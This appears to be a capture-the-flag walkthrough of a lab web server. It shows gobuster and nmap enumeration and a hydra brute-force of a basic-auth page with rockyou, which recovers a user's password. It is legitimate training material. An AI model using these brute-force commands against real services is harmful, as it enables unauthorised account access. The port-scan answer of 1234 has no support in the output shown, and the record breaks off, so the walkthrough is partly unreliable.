[1.1. WHAT DIRECTORY CAN YOU FIND, THAT BEGINS WITH A "g"?]
[ACTION: quick gobuster scan]
gobuster dir -u http://10.10.248.77 -w /usr/share/seclists/Discovery/Web-Content/common.txt
[OUTPUT]
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/guidelines           (Status: 301) [Size: 317] [--> http://10.10.248.77/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 459]
/server-status        (Status: 403) [Size: 300]
[ANSWER]
guidelines



[1.2. WHOSE NAME CAN YOU FIND FROM THIS DIRECTORY?]
[ACTION: visit http://10.10.248.77/guidelines/]
[OUTPUT]
Hey bob, did you update that TomCat server?
[ANSWER]
bob



[1.3. WHAT DIRECTORY HAS BASIC AUTHENTICATION?]
[NOTE]
401 status code means unauthorized access.
[ANSWER (based on previous output)]
protected



[1.4. WHAT IS BOB'S PASSWORD TO THE PROTECTED PART OF THE WEBSITE?]
[ACTION: visit http://10.10.248.77/protected]
[OUTPUT (js popup)]
Sign in
http://10.10.248.77
Your connection to this site is not private
Username
Password


[ACTION: try to inspect /protected]
We open inspector (CTRL + i) and attempt to view the log in request in the Network tab.
However, the request doesn't display on the side. So we can't really get the name of the parameters for password and username.
We probably have a wrong approach.


[ACTION: hydra bruteforce /protected]
hydra -l bob -P ~/thm/rockyou.txt 10.10.248.77 http-get /protected
[OUTPUT]
[80][http-get] host: 10.10.248.77   login: bob   password: bubbles
[NOTE]
As the login is done in a pop-up, we can't run the usual http-post-form hydra command. (there are no <form>...</form> values since there isn't even an html site displayed).
The site instead uses http basic auth.
Summed up (type input when doing log in -> hydra module):
Popup -> http-get/http-head
Html form -> http-post-form/http-get-form
[ANSWER]
bubbles



[1.5. WHAT OTHER PORT THAT SERVES A WEBS SERVICE IS OPEN ON THE MACHINE?]
[ACTION: nmap quick all port scan]
nmap -sS -T4 -sV -p- 10.10.248.77

8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[NOTE]
Port is 80, which means we have been visiting 80 this whole time. The one we are asked about is 1234.
[ANSWER]
1234



[1.6. WHAT IS THE NAME AND VERSION OF THE SOFTWARE RUNNING ON THE PORT FROM QUESTION 5?]
[(WRONG) ANSWER (based on last output)]
